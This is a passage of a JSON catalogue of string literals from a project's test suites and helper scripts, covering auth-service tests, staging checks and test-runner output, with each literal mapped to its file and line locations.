      "value": "Unix socket path doesn't exist in Cloud Run environment",
      "category": "test_literals",
      "locations": [
        "auth_service/test_url_construction.py:199"
      ]
    },
    "Unjustified mocks by category:": {
      "value": "Unjustified mocks by category:",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:169"
      ]
    },
    "Unjustified mocks:": {
      "value": "Unjustified mocks:",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:168"
      ]
    },
    "Unknown": {
      "value": "Unknown",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_batch.py:79",
        "scripts/team_updates_test_analyzer.py:58",
        "scripts/test_backend_optimized.py:214",
        "scripts/test_staging_config.py:97",
        "scripts/test_workflows_with_act.py:211"
      ]
    },
    "Unknown Variable Access env": {
      "value": "Unknown Variable Access env",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:312"
      ]
    },
    "Unknown category:": {
      "value": "Unknown category:",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:216",
        "scripts/test_backend_optimized.py:296"
      ]
    },
    "Unknown error": {
      "value": "Unknown error",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:221"
      ]
    },
    "Unknown role:": {
      "value": "Unknown role:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/permission_factory.py:237"
      ]
    },
    "Unknown test type:": {
      "value": "Unknown test type:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_env.py:221"
      ]
    },
    "Unsupported OAuth provider:": {
      "value": "Unsupported OAuth provider:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/test_mixins.py:230"
      ]
    },
    "Update Jest snapshots": {
      "value": "Update Jest snapshots",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:402"
      ]
    },
    "Update optimization models based on execution results": {
      "value": "Update optimization models based on execution results",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:224"
      ]
    },
    "Updated configurations:": {
      "value": "Updated configurations:",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:440"
      ]
    },
    "Updated references in:": {
      "value": "Updated references in:",
      "category": "test_literals",
      "locations": [
        "scripts/standardize_l3_test_names.py:124"
      ]
    },
    "Updated test discovery configuration": {
      "value": "Updated test discovery configuration",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:339"
      ]
    },
    "Updated test runner configuration": {
      "value": "Updated test runner configuration",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:234"
      ]
    },
    "Updated test to use": {
      "value": "Updated test to use",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_batch.py:191"
      ]
    },
    "Updating optimization models with execution data": {
      "value": "Updating optimization models with execution data",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:226"
      ]
    },
    "Upstream service responding slowly": {
      "value": "Upstream service responding slowly",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/log_generator.py:105"
      ]
    },
    "Usage:": {
      "value": "Usage:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:127"
      ]
    },
    "Usage: python standardize_l3_test_names.py [options]": {
      "value": "Usage: python standardize_l3_test_names.py [options]",
      "category": "test_literals",
      "locations": [
        "scripts/standardize_l3_test_names.py:299"
      ]
    },
    "Use Docker services instead of local processes": {
      "value": "Use Docker services instead of local processes",
      "category": "test_literals",
      "locations": [
        "scripts/start_test_services.py:174"
      ]
    },
    "Use deployment pipeline for real migrations": {
      "value": "Use deployment pipeline for real migrations",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_migrations.py:264"
      ]
    },
    "Use pytest fixtures to reduce test function length:\n\n@pytest.fixture\ndef authenticated_user():\n    user_data = {\"email\": \"test@example.com\", \"password\": \"password\"}\n    user = create_user(user_data)\n    token = authenticate_user(user.email, user_data[\"password\"])\n    return user, token\n\ndef test_user_can_access_profile(authenticated_user):\n    user, token = authenticated_user\n    profile = get_user_profile(user.id, token)\n    assert profile[\"email\"] == user.email": {
      "value": "Use pytest fixtures to reduce test function length:\n\n@pytest.fixture\ndef authenticated_user():\n    user_data = {\"email\": \"test@example.com\", \"password\": \"password\"}\n    user = create_user(user_data)\n    token = authenticate_user(user.email, user_data[\"password\"])\n    return user, token\n\ndef test_user_can_access_profile(authenticated_user):\n    user, token = authenticated_user\n    profile = get_user_profile(user.id, token)\n    assert profile[\"email\"] == user.email",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_limits_examples.py:230"
      ]
    },
    "Use pytest.mark.parametrize to reduce function length:\n\n@pytest.mark.parametrize(\"email,password,expected\", [\n    (\"valid@email.com\", \"strong_password\", True),\n    (\"invalid-email\", \"password\", False),\n    (\"valid@email.com\", \"weak\", False),\n])\ndef test_user_validation(email, password, expected):\n    result = validate_user_data({\"email\": email, \"password\": password})\n    assert result == expected": {
      "value": "Use pytest.mark.parametrize to reduce function length:\n\n@pytest.mark.parametrize(\"email,password,expected\", [\n    (\"valid@email.com\", \"strong_password\", True),\n    (\"invalid-email\", \"password\", False),\n    (\"valid@email.com\", \"weak\", False),\n])\ndef test_user_validation(email, password, expected):\n    result = validate_user_data({\"email\": email, \"password\": password})\n    assert result == expected",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_limits_examples.py:248"
      ]
    },
    "Use real LLM instead of mocks": {
      "value": "Use real LLM instead of mocks",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:751"
      ]
    },
    "Use real backend services (Docker or local) for frontend tests": {
      "value": "Use real backend services (Docker or local) for frontend tests",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:757"
      ]
    },
    "Use real components or move mocks to shared test utilities": {
      "value": "Use real components or move mocks to shared test utilities",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:385"
      ]
    },
    "Use test isolation for concurrent execution": {
      "value": "Use test isolation for concurrent execution",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:512",
        "scripts/test_frontend.py:422"
      ]
    },
    "User": {
      "value": "User",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/test_mixins.py:33",
        "auth_service/tests/base/test_mixins.py:38",
        "auth_service/tests/base/test_mixins.py:43",
        "auth_service/tests/test_oauth_id_token_validation.py:47",
        "auth_service/tests/utils/assertion_helpers.py:180"
      ]
    },
    "User Test Data Factory\nCreates test users with consistent data patterns for auth service testing.\nSupports both local and OAuth users with proper password handling.": {
      "value": "User Test Data Factory\nCreates test users with consistent data patterns for auth service testing.\nSupports both local and OAuth users with proper password handling.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/user_factory.py:1"
      ]
    },
    "User denied access": {
      "value": "User denied access",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:119"
      ]
    },
    "User info fetch timeout": {
      "value": "User info fetch timeout",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:327"
      ]
    },
    "User info timeout": {
      "value": "User info timeout",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:326"
      ]
    },
    "User management components not yet implemented": {
      "value": "User management components not yet implemented",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_service_integration_reliability.py:165"
      ]
    },
    "User not found": {
      "value": "User not found",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:259",
        "auth_service/tests/utils/test_client.py:259"
      ]
    },
    "User should be blacklisted": {
      "value": "User should be blacklisted",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_token_blacklisting_basics.py:123"
      ]
    },
    "User should be detected as blacklisted": {
      "value": "User should be detected as blacklisted",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_token_blacklisting_basics.py:108"
      ]
    },
    "User should not be blacklisted initially": {
      "value": "User should not be blacklisted initially",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_token_blacklisting_basics.py:97"
      ]
    },
    "User should not be blacklisted yet": {
      "value": "User should not be blacklisted yet",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_token_blacklisting_basics.py:104"
      ]
    },
    "User with email": {
      "value": "User with email",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/test_helpers.py:112"
      ]
    },
    "User's access token should be blacklisted": {
      "value": "User's access token should be blacklisted",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_token_blacklisting_basics.py:84"
      ]
    },
    "User's refresh token should be blacklisted": {
      "value": "User's refresh token should be blacklisted",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_token_blacklisting_basics.py:85"
      ]
    },
    "User-Agent": {
      "value": "User-Agent",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:286",
        "auth_service/tests/test_security.py:559",
        "auth_service/tests/test_security.py:695"
      ]
    },
    "User.": {
      "value": "User.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/assertion_helpers.py:186"
      ]
    },
    "User:": {
      "value": "User:",
      "category": "test_literals",
      "locations": [
        "scripts/test_ssl_certificates_staging.py:218",
        "scripts/test_staging_db_direct.py:47",
        "scripts/test_staging_migrations.py:47"
      ]
    },
    "User: [cyan]": {
      "value": "User: [cyan]",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:309"
      ]
    },
    "UserFactory": {
      "value": "UserFactory",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/__init__.py:13"
      ]
    },
    "UserFlowTestBase": {
      "value": "UserFlowTestBase",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:240",
        "scripts/fix_test_import_errors.py:241"
      ]
    },
    "Uses deprecated unittest patterns": {
      "value": "Uses deprecated unittest patterns",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:272"
      ]
    },
    "Uses hardcoded sleep": {
      "value": "Uses hardcoded sleep",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:282"
      ]
    },
    "Uses postgres:// instead of postgresql+asyncpg://": {
      "value": "Uses postgres:// instead of postgresql+asyncpg://",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_auth_ssl_failures.py:316"
      ]
    },
    "Using URL:": {
      "value": "Using URL:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:197"
      ]
    },
    "Using fallback execution method": {
      "value": "Using fallback execution method",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:243"
      ]
    },
    "VALIDATION ERROR:": {
      "value": "VALIDATION ERROR:",
      "category": "test_literals",
      "locations": [
        "scripts/test_ssl_certificates_staging.py:190"
      ]
    },
    "VALIDATION MISMATCH!": {
      "value": "VALIDATION MISMATCH!",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:246"
      ]
    },
    "VERIFIED FUNCTIONALITY:": {
      "value": "VERIFIED FUNCTIONALITY:",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:316"
      ]
    },
    "VIOLATION EXAMPLES FOR FIXES:": {
      "value": "VIOLATION EXAMPLES FOR FIXES:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/project_test_validator.py:397"
      ]
    },
    "VIOLATION TYPE BREAKDOWN:": {
      "value": "VIOLATION TYPE BREAKDOWN:",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:319"
      ]
    },
    "VIOLATION: conftest.py files found in non-service-level directories:": {
      "value": "VIOLATION: conftest.py files found in non-service-level directories:",
      "category": "test_literals",
      "locations": [
        "scripts/check_conftest_violations.py:85"
      ]
    },
    "VIOLATIONS:": {
      "value": "VIOLATIONS:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:437"
      ]
    },
    "Valid": {
      "value": "Valid",
      "category": "test_literals",
      "locations": [
        "scripts/test_ssl_certificates_staging.py:193"
      ]
    },
    "Valid Cloud SQL configuration": {
      "value": "Valid Cloud SQL configuration",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:200"
      ]
    },
    "Valid ID token should be accepted": {
      "value": "Valid ID token should be accepted",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_oauth_id_token_validation.py:71"
      ]
    },
    "Valid staging credentials should not cause connection failure:": {
      "value": "Valid staging credentials should not cause connection failure:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:446"
      ]
    },
    "Valid state should pass validation": {
      "value": "Valid state should pass validation",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_state_security.py:82"
      ]
    },
    "Valid:": {
      "value": "Valid:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:732",
        "scripts/test_database_url_builder_comprehensive.py:34",
        "scripts/test_database_url_builder_comprehensive.py:91",
        "scripts/test_database_url_builder_comprehensive.py:133"
      ]
    },
    "Validate splitting suggestion": {
      "value": "Validate splitting suggestion",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:683"
      ]
    },
    "Validate test structure and configuration": {
      "value": "Validate test structure and configuration",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:862"
      ]
    },
    "Validating:": {
      "value": "Validating:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:86"
      ]
    },
    "Validation Edge Cases": {
      "value": "Validation Edge Cases",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:309"
      ]
    },
    "Validation Issues Found:": {
      "value": "Validation Issues Found:",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:924"
      ]
    },
    "Validation Test": {
      "value": "Validation Test",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:284"
      ]
    },
    "Validation correct": {
      "value": "Validation correct",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:249"
      ]
    },
    "Validation error:": {
      "value": "Validation error:",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:337"
      ]
    },
    "Validation failed with exception:": {
      "value": "Validation failed with exception:",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:428"
      ]
    },
    "Validation for": {
      "value": "Validation for",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:731"
      ]
    },
    "Value": {
      "value": "Value",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:70"
      ]
    },
    "Variable": {
      "value": "Variable",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:68"
      ]
    },
    "Verbose output": {
      "value": "Verbose output",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:389",
        "scripts/test_backend.py:501",
        "scripts/test_backend_optimized.py:389",
        "scripts/test_example_message_flow.py:434",
        "scripts/test_frontend.py:417",
        "scripts/unified_test_runner.py:796"
      ]
    },
    "Verification summary saved to: workflow_verification_results.md": {
      "value": "Verification summary saved to: workflow_verification_results.md",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status_corrected.py:262"
      ]
    },
    "Verify GitHub workflow status": {
      "value": "Verify GitHub workflow status",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow.py:35",
        "scripts/test_verify_workflow_status_corrected.py:90"
      ]
    },
    "Verify all dependencies are preserved": {
      "value": "Verify all dependencies are preserved",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:582"
      ]
    },
    "Verify all functions are included in the split": {
      "value": "Verify all functions are included in the split",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:639"
      ]
    },
    "Verify help text displays correctly": {
      "value": "Verify help text displays correctly",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status.py:80"
      ]
    },
    "Very low success rate (": {
      "value": "Very low success rate (",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:298"
      ]
    },
    "Very short timeout": {
      "value": "Very short timeout",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_graceful_shutdown_failures.py:372"
      ]
    },
    "VeryLongPasswordThatExceedsTypicalLimits123456789!@#$%^&*()": {
      "value": "VeryLongPasswordThatExceedsTypicalLimits123456789!@#$%^&*()",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_password_hashing_basics.py:38"
      ]
    },
    "Violations (": {
      "value": "Violations (",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/project_test_validator.py:344"
      ]
    },
    "Violations found:": {
      "value": "Violations found:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:41"
      ]
    },
    "Violations:": {
      "value": "Violations:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:38"
      ]
    },
    "WARNING": {
      "value": "WARNING",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/log_generator.py:74",
        "netra_backend/app/services/realistic_test_data/log_generator.py:81",
        "netra_backend/app/services/realistic_test_data/log_generator.py:88",
        "auth_service/tests/config/test_env.py:165",
        "auth_service/tests/config/test_settings.py:115",
        "scripts/test_backend.py:92",
        "scripts/test_error_monitor_logic.py:37",
        "scripts/test_error_monitor_logic.py:65"
      ]
    },
    "WARNING:": {
      "value": "WARNING:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:267",
        "scripts/auto_fix_test_violations.py:723"
      ]
    },
    "WARNING: Auto-fix capabilities are DANGEROUS and disabled by default!": {
      "value": "WARNING: Auto-fix capabilities are DANGEROUS and disabled by default!",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:917"
      ]
    },
    "WARNING: Expected valid URL to pass validation": {
      "value": "WARNING: Expected valid URL to pass validation",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:183"
      ]
    },
    "WARNING: Found": {
      "value": "WARNING: Found",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:451"
      ]
    },
    "WARNING: Found naming conflicts in": {
      "value": "WARNING: Found naming conflicts in",
      "category": "test_literals",
      "locations": [
        "scripts/standardize_l3_test_names.py:239"
      ]
    },
    "WARNING: New file": {
      "value": "WARNING: New file",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:838"
      ]
    },
    "WARNING: Socket path does not exist:": {
      "value": "WARNING: Socket path does not exist:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:245"
      ]
    },
    "WEBSOCKET DEV MODE FUNCTIONAL TEST REPORT": {
      "value": "WEBSOCKET DEV MODE FUNCTIONAL TEST REPORT",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:289"
      ]
    },
    "WEBSOCKET_URL": {
      "value": "WEBSOCKET_URL",
      "category": "test_literals",
      "locations": [
        "scripts/start_test_services.py:155",
        "scripts/unified_test_runner.py:185",
        "scripts/unified_test_runner.py:185"
      ]
    },
    "WS_BASE_URL": {
      "value": "WS_BASE_URL",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging.py:31"
      ]
    },
    "Wait for all services to be healthy.": {
      "value": "Wait for all services to be healthy.",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:144"
      ]
    },
    "Waiting for Docker services to be healthy...": {
      "value": "Waiting for Docker services to be healthy...",
      "category": "test_literals",
      "locations": [
        "scripts/start_test_services.py:199"
      ]
    },
    "Waiting for services to be ready...": {
      "value": "Waiting for services to be ready...",
      "category": "test_literals",
      "locations": [
        "scripts/start_test_services.py:113"
      ]
    },
    "Warning: Categories not found:": {
      "value": "Warning: Categories not found:",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:253"
      ]
    },
    "Warning: Could not load .env.test file:": {
      "value": "Warning: Could not load .env.test file:",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:231"
      ]
    },
    "Warning: File not found:": {
      "value": "Warning: File not found:",
      "category": "test_literals",
      "locations": [
        "scripts/add_test_markers.py:137"
      ]
    },
    "Warning: Known failing file not found:": {
      "value": "Warning: Known failing file not found:",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:258"
      ]
    },
    "Warning: Resume category '": {
      "value": "Warning: Resume category '",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:260"
      ]
    },
    "Warning: python-dotenv not installed, using default test environment": {
      "value": "Warning: python-dotenv not installed, using default test environment",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:73"
      ]
    },
    "Warnings:": {
      "value": "Warnings:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:734"
      ]
    },
    "Weak OAUTH_HMAC_SECRET not detected: '": {
      "value": "Weak OAUTH_HMAC_SECRET not detected: '",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:324"
      ]
    },
    "WebSocket": {
      "value": "WebSocket",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_deployment.py:173"
      ]
    },
    "WebSocket Connection": {
      "value": "WebSocket Connection",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_deployment.py:149",
        "scripts/test_staging_env.py:149"
      ]
    },
    "WebSocket URL not found": {
      "value": "WebSocket URL not found",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:268",
        "scripts/test_cold_start_e2e.py:377"
      ]
    },
    "WebSocket auth failed:": {
      "value": "WebSocket auth failed:",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:302"
      ]
    },
    "WebSocket auth properly rejected invalid token - GOOD!": {
      "value": "WebSocket auth properly rejected invalid token - GOOD!",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:218"
      ]
    },
    "WebSocket closed unexpectedly:": {
      "value": "WebSocket closed unexpectedly:",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:223"
      ]
    },
    "WebSocket config endpoint test PASSED": {
      "value": "WebSocket config endpoint test PASSED",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:98"
      ]
    },
    "WebSocket connected successfully": {
      "value": "WebSocket connected successfully",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:189"
      ]
    },
    "WebSocket connection successful": {
      "value": "WebSocket connection successful",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_env.py:95"
      ]
    },
    "WebSocket health endpoint test PASSED": {
      "value": "WebSocket health endpoint test PASSED",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:128"
      ]
    },
    "WebSocket implementation is working correctly in DEV MODE!": {
      "value": "WebSocket implementation is working correctly in DEV MODE!",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:311"
      ]
    },
    "WebSocket test failed:": {
      "value": "WebSocket test failed:",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:306",
        "scripts/test_staging_env.py:99",
        "scripts/test_websocket_dev_mode.py:232"
      ]
    },
    "WebSocket-related tests": {
      "value": "WebSocket-related tests",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:86"
      ]
    },
    "Worker Utilization:": {
      "value": "Worker Utilization:",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:353"
      ]
    },
    "Workflow Status Verification Script - Corrected Test Suite": {
      "value": "Workflow Status Verification Script - Corrected Test Suite",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status_corrected.py:178"
      ]
    },
    "Workload Simulator\n\nThis module generates realistic workload patterns with seasonality and business logic.": {
      "value": "Workload Simulator\n\nThis module generates realistic workload patterns with seasonality and business logic.",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:1"
      ]
    },
    "Workload optimized. Performance improved by 25%.": {
      "value": "Workload optimized. Performance improved by 25%.",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/llm_response_generator.py:214"
      ]
    },
    "WorkloadSimulator": {
      "value": "WorkloadSimulator",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/__init__.py:84"
      ]
    },
    "Would add to": {
      "value": "Would add to",
      "category": "test_literals",
      "locations": [
        "scripts/add_test_markers.py:220"
      ]
    },
    "Would split": {
      "value": "Would split",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:830"
      ]
    },
    "WrongPassword123!": {
      "value": "WrongPassword123!",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_password_hashing_basics.py:80"
      ]
    },
    "X-Forwarded-For": {
      "value": "X-Forwarded-For",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:560",
        "auth_service/tests/test_security.py:696"
      ]
    },
    "X-HTTP-Method-Override": {
      "value": "X-HTTP-Method-Override",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:380"
      ]
    },
    "X-Method-Override": {
      "value": "X-Method-Override",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:381"
      ]
    },
    "X-RateLimit-Limit": {
      "value": "X-RateLimit-Limit",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/assertion_helpers.py:239"
      ]
    },
    "X-RateLimit-Remaining": {
      "value": "X-RateLimit-Remaining",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/assertion_helpers.py:240",
        "auth_service/tests/utils/assertion_helpers.py:243"
      ]
    },
    "X-RateLimit-Reset": {
      "value": "X-RateLimit-Reset",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/assertion_helpers.py:241"
      ]
    },
    "X-Service-Name": {
      "value": "X-Service-Name",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_issues.py:204",
        "auth_service/tests/test_critical_staging_issues.py:205"
      ]
    },
    "YES": {
      "value": "YES",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status_corrected.py:49"
      ]
    },
    "YES I UNDERSTAND THE RISKS": {
      "value": "YES I UNDERSTAND THE RISKS",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:957"
      ]
    },
    "Z": {
      "value": "Z",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/assertion_helpers.py:127",
        "auth_service/tests/utils/assertion_helpers.py:129"
      ]
    },
    "ZmVybmV0LXRlc3Qta2V5LXBsYWNlaG9sZGVyLTEyMw==": {
      "value": "ZmVybmV0LXRlc3Qta2V5LXBsYWNlaG9sZGVyLTEyMw==",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_config.py:55",
        "scripts/test_staging_config.py:136"
      ]
    },
    "[": {
      "value": "[",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:391",
        "scripts/cleanup_test_processes.py:108",
        "scripts/cleanup_test_processes.py:166",
        "scripts/comprehensive_test_fixer.py:304",
        "scripts/standardize_l3_test_names.py:273",
        "scripts/test_verify_workflow_status_corrected.py:202"
      ]
    },
    "[!] Action Required: Fix violations to improve test quality": {
      "value": "[!] Action Required: Fix violations to improve test quality",
      "category": "test_literals",
      "locations": [
        "scripts/check_test_compliance.py:192"
      ]
    },
    "[+] CORS validation implemented": {
      "value": "[+] CORS validation implemented",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:320"
      ]
    },
    "[+] Configuration and health endpoints working": {
      "value": "[+] Configuration and health endpoints working",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:319"
      ]
    },
    "[+] Connection management working": {
      "value": "[+] Connection management working",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:322"
      ]
    },
    "[+] JWT authentication enforced": {
      "value": "[+] JWT authentication enforced",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:321"
      ]
    },
    "[+] Message processing implemented": {
      "value": "[+] Message processing implemented",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:323"
      ]
    },
    "[+] Resource cleanup functioning": {
      "value": "[+] Resource cleanup functioning",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:324"
      ]
    },
    "[+] Secure WebSocket endpoints registered": {
      "value": "[+] Secure WebSocket endpoints registered",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:318"
      ]
    },
    "[/cyan]": {
      "value": "[/cyan]",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:309",
        "scripts/test_oauth_local.py:437",
        "scripts/test_oauth_local.py:438"
      ]
    },
    "[/green]": {
      "value": "[/green]",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:462"
      ]
    },
    "[/red]": {
      "value": "[/red]",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:116",
        "scripts/test_oauth_local.py:131",
        "scripts/test_oauth_local.py:465"
      ]
    },
    "[AUTO-FIX] Applying automatic improvements...": {
      "value": "[AUTO-FIX] Applying automatic improvements...",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:63",
        "scripts/autonomous_review/test_reviewer.py:274"
      ]
    },
    "[CONTENT] Contains '": {
      "value": "[CONTENT] Contains '",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status_corrected.py:49"
      ]
    },
    "[COVERAGE] Analyzing test coverage...": {
      "value": "[COVERAGE] Analyzing test coverage...",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:46"
      ]
    },
    "[CRITICAL]": {
      "value": "[CRITICAL]",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_validator.py:301"
      ]
    },
